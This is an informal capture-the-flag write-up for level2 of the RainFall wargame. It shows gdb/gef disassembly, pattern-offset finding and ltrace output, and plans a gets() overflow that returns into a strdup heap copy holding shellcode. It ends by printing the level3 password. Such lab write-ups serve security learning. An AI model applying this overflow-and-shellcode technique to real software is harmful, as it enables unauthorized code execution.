so frist connect to level2

get the elf and test

./level2
a
a

so i think is get un stdin and print in stdout so let's show the code

and show is call p 

and the code of function p is that :
gef➤  x/20i p
   0x80484d4 <p>:	push   ebp
   0x80484d5 <p+1>:	mov    ebp,esp
=> 0x80484d7 <p+3>:	sub    esp,0x68
   0x80484da <p+6>:	mov    eax,ds:0x8049860
   0x80484df <p+11>:	mov    DWORD PTR [esp],eax
   0x80484e2 <p+14>:	call   0x80483b0 <fflush@plt>
   0x80484e7 <p+19>:	lea    eax,[ebp-0x4c]
   0x80484ea <p+22>:	mov    DWORD PTR [esp],eax
   0x80484ed <p+25>:	call   0x80483c0 <gets@plt>
   0x80484f2 <p+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x80484f5 <p+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x80484f8 <p+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x80484fb <p+39>:	and    eax,0xb0000000
   0x8048500 <p+44>:	cmp    eax,0xb0000000
   0x8048505 <p+49>:	jne    0x8048527 <p+83>
   0x8048507 <p+51>:	mov    eax,0x8048620
   0x804850c <p+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x804850f <p+59>:	mov    DWORD PTR [esp+0x4],edx
   0x8048513 <p+63>:	mov    DWORD PTR [esp],eax
   0x8048516 <p+66>:	call   0x80483a0 <printf@plt>



so to overridth the buffer of eip 

because i have 
and eax, 0xB0000000
cmp eax, 0xB0000000


you need some adresse to be in range 0xB0000000 à 0xBFFFFFFF.

and to overight the buffer go to search the size of the buffer

let'st try with gef

pattern create 128 

affter i found :
 Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804a9c0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0xf7f9d000  →  0x00229dac
$ecx   : 0x0       
$edx   : 0xffffce9c  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$esp   : 0xffffcef0  →  "vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab"
$ebp   : 0x61616174 ("taaa"?)
$esi   : 0xffffcfb4  →  0xffffd1a3  →  "/home/onyx/IdeaProjects/Rainfall/level2/Resources/[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61616175 ("uaaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcef0│+0x0000: "vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab"	 ← $esp
0xffffcef4│+0x0004: "waaaxaaayaaazaabbaabcaabdaabeaabfaabgaab"
0xffffcef8│+0x0008: "xaaayaaazaabbaabcaabdaabeaabfaabgaab"
0xffffcefc│+0x000c: "yaaazaabbaabcaabdaabeaabfaabgaab"
0xffffcf00│+0x0010: "zaabbaabcaabdaabeaabfaabgaab"
0xffffcf04│+0x0014: "baabcaabdaabeaabfaabgaab"
0xffffcf08│+0x0018: "caabdaabeaabfaabgaab"
0xffffcf0c│+0x001c: "daabeaabfaabgaab"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616175
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "level2", stopped 0x61616175 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  patter search 0x61616175
[+] Searching for '75616161'/'61616175' with period=4
[+] Found at offset 80 (little-endian search) likely



so how to get a addres eip to  0xB0000000 à 0xBFFFFFFF. so this rang
Due to this check we couldn't point the return address to the stack (0xbf000000 - 0xbfffffff range). This avoids having a shellcode stored on the stack or in environment variable.
But if we can't use the stack we can use the heap !

and i found the call off strdup in the eax so is in range that heap


   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret


so let's tryp with lstrace and i found this :


level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff704, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                     = 0
gets(0xbffff60c, 0, 0, 0xb7e5ec73, 0x80482b5a
)                                          = 0xbffff60c
puts("a"a
)                                                                              = 2
strdup("a")                                                                            = 0x0804a008
+++ exited (status 8) +++


so the return of the strup return a adrresse 0x0804a008


so let's create a buffer  with 80 octet with 4 octet for addresse 0x0804a008 and shell code with padding to make a bufffer of 80octet

=> shellcode + padd for make 80 octet + 4octet
so the payload make 84octet


let'st try and win the flag

$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02